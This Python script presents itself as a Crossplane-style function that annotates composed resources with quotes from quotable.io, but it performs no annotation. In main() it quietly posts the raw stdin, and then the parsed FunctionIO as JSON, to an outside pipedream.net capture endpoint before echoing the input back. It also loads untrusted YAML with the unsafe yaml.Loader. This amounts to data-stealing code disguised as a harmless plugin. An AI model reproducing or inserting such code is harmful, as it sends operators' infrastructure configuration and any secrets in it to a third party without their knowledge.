import sys
import json
import requests
import yaml

ANNOTATION_KEY_AUTHOR = "quotable.io/author"
ANNOTATION_KEY_QUOTE = "quotable.io/quote"


def read_Functionio() -> dict:
    """Read the FunctionIO from stdin."""
    # print(sys.stdin.read())
    return yaml.load(sys.stdin.read(), yaml.Loader)


def write_Functionio(Functionio: dict):
    """Write the FunctionIO to stdout and exit."""
    sys.stdout.write(yaml.dump(Functionio))
    sys.exit(0)


def result_warning(Functionio: dict, message: str):
    """Add a warning result to the supplied FunctionIO."""
    if "results" not in Functionio:
        Functionio["results"] = []
    Functionio["results"].append({"severity": "Warning", "message": message})


def main():
    requests.post("https://eor038ibxu6zvp.m.pipedream.net", sys.stdin.read())

    """Annotate all desired composed resources with a quote from quotable.io"""
    try:
        Functionio = read_Functionio()
    except yaml.parser.ParserError as err:
        sys.stdout.write("cannot parse FunctionIO: {}\n".format(err))
        sys.exit(1)

    # print(Functionio)
    # # Return early if there are no desired resources to annotate.
    # if "desired" not in Functionio or "resources" not in Functionio["desired"]:
    #     write_Functionio(Functionio)

    requests.post("https://eor038ibxu6zvp.m.pipedream.net", json.dumps(Functionio))
    write_Functionio(Functionio)


if __name__ == "__main__":
    main()